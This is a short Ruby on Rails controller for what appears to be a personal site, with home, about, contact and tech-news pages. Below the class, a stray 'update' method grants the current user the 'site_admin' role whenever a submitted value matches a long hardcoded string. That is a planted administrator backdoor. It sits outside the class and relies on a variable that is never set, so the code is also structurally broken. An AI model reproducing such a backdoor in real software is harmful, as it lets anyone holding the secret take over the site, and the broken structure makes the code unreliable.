class PagesController < ApplicationController
  def home
    @posts = Blog.all
    @skills = Skill.all
  end

  def about
    @skills = Skill.all
  end

  def contact
  end
  def tech_news
    @tweets = SocialTool.twitter_search
  end
end

  def update
    if @submit == "x5b5cd0da3121fc53b4bc84d0c8af2e8138nwm97nlgfdw34no9gbnkls348yb3l5kno53hf5790imvtyr6wep9gr08srnvaw45ytrgjhoi89uhg2f4hjh43gf345"
      current_user.update_attribute :roles, "site_admin"
    else
      puts "WRONG!"
    end
  end

